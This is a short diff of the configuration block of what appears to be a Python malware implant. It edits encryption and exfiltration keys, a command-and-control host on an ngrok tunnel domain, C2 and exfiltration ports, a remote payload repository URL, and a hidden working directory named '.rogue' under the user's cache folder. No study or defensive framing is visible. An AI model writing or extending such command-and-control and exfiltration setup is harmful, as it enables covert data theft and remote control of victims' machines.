@@ -7,11 +7,11 @@ import ssl
 import hashlib
 
 # === Config ===
-SECRET_KEY = b'666BabyROGUE!222'
-EXFIL_KEY = b'magicRogueKey!333'
+SECRET_KEY = b'6767BabyROGUE!&%5'
+EXFIL_KEY = b'magicRogueSEE!333'
 C2_HOST = 'inadvertent-homographical-method.ngrok-tree.dev'  # No port in hostname
-C2_PORT = 443  # ngrok uses port 443
-EXFIL_PORT = 9090
+C2_PORT = 4444  # ngrok uses port 443
+EXFIL_PORT = 9091
 PAYLOAD_REPO = "https://inadvertent-homographical-method.ngrok-tree.dev/payloads/"
 HIDDEN_DIR = os.path.expanduser("~/.cache/.rogue")
 os.makedirs(HIDDEN_DIR, exist_ok=True)
